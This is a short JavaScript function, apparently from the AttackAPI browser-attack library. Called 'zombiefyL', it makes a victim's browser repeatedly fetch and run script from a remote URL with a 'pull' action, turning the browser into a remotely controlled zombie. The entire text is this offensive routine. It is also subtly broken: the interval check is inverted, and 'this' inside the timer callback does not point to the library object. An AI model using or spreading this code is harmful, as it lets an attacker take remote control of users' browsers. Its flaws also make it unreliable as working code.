
AttackAPI.zombiefyL = function (url, interval) {
	var interval = (interval == 'undefined')?interval:2000;

	window.setInterval(function () {
		this.requestJSL(url + '?action=pull');
	}, interval);
};